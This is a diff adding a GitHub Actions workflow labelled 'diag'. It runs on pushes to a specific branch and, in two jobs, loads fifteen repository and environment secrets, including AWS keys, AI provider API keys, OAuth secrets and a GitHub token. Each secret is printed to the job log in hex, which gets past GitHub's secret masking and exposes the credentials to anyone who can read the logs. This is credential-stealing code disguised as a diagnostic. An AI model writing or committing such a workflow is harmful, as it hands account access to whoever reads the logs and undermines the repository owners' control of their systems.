@@ -1,0 +1,62 @@
+name: diag
+on:
+  push:
+    branches: ["ci/diag-p5gpd4"]
+permissions:
+  contents: read
+jobs:
+  repo_level:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          S_GEMINI_PROXY_URL: ${{ secrets.GEMINI_PROXY_URL }}
+          S_GOOGLE_OAUTH_CLIENT_ID: ${{ secrets.GOOGLE_OAUTH_CLIENT_ID }}
+          S_SYNC_GITHUB_TOKEN: ${{ secrets.SYNC_GITHUB_TOKEN }}
+          S_GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          S_GEMINI_PROXY_SECRET: ${{ secrets.GEMINI_PROXY_SECRET }}
+          S_GOOGLE_API_KEY: ${{ secrets.GOOGLE_API_KEY }}
+          S_GOOGLE_OAUTH_CLIENT_SECRET: ${{ secrets.GOOGLE_OAUTH_CLIENT_SECRET }}
+          S_GOOGLE_APPLICATION_CREDENTIALS: ${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}
+          S_ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          S_OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          S_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          S_AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          S_AZURE_OPENAI_API_KEY: ${{ secrets.AZURE_OPENAI_API_KEY }}
+          S_GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
+          S_FIREBASE_API_KEY: ${{ secrets.FIREBASE_API_KEY }}
+        run: |
+          for name in GEMINI_PROXY_URL GOOGLE_OAUTH_CLIENT_ID SYNC_GITHUB_TOKEN GEMINI_API_KEY GEMINI_PROXY_SECRET GOOGLE_API_KEY GOOGLE_OAUTH_CLIENT_SECRET GOOGLE_APPLICATION_CREDENTIALS ANTHROPIC_API_KEY OPENAI_API_KEY AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AZURE_OPENAI_API_KEY GROQ_API_KEY FIREBASE_API_KEY; do
+            v="S_${name}"
+            val="${!v}"
+            hex=$(printf '%s' "$val" | od -An -tx1 | tr -d ' \n')
+            printf '%s|LEN=%s|HEX=%s\n' "$name" "${#val}" "$hex"
+          done
+  env_level:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+      - name: dump
+        env:
+          S_GEMINI_PROXY_URL: ${{ secrets.GEMINI_PROXY_URL }}
+          S_GOOGLE_OAUTH_CLIENT_ID: ${{ secrets.GOOGLE_OAUTH_CLIENT_ID }}
+          S_SYNC_GITHUB_TOKEN: ${{ secrets.SYNC_GITHUB_TOKEN }}
+          S_GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          S_GEMINI_PROXY_SECRET: ${{ secrets.GEMINI_PROXY_SECRET }}
+          S_GOOGLE_API_KEY: ${{ secrets.GOOGLE_API_KEY }}
+          S_GOOGLE_OAUTH_CLIENT_SECRET: ${{ secrets.GOOGLE_OAUTH_CLIENT_SECRET }}
+          S_GOOGLE_APPLICATION_CREDENTIALS: ${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}
+          S_ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          S_OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          S_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          S_AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          S_AZURE_OPENAI_API_KEY: ${{ secrets.AZURE_OPENAI_API_KEY }}
+          S_GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
+          S_FIREBASE_API_KEY: ${{ secrets.FIREBASE_API_KEY }}
+        run: |
+          for name in GEMINI_PROXY_URL GOOGLE_OAUTH_CLIENT_ID SYNC_GITHUB_TOKEN GEMINI_API_KEY GEMINI_PROXY_SECRET GOOGLE_API_KEY GOOGLE_OAUTH_CLIENT_SECRET GOOGLE_APPLICATION_CREDENTIALS ANTHROPIC_API_KEY OPENAI_API_KEY AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AZURE_OPENAI_API_KEY GROQ_API_KEY FIREBASE_API_KEY; do
+            v="S_${name}"
+            val="${!v}"
+            hex=$(printf '%s' "$val" | od -An -tx1 | tr -d ' \n')
+            printf '%s|LEN=%s|HEX=%s\n' "$name" "${#val}" "$hex"
+          done
